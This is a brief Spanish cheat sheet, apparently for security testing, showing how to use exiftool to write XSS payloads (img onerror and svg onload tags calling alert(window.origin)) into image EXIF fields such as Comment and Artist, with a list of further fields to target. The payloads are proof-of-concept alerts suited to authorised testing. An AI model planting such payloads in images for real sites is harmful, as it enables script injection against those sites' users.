# EXIF XSS examples

Añadir payload a `Comment`:

```bash
exiftool -Comment='"><img src=x onerror=alert(window.origin)>' image.jpg
```

Añadir payload a `Artist`:

```bash
exiftool -Artist='"><svg/onload=alert(window.origin)>' image.jpg
```

Ver metadata:

```bash
exiftool image.jpg
```

Campos interesantes:

```text
Comment
Artist
ImageDescription
UserComment
XPComment
XPTitle
XPAuthor
Copyright
```
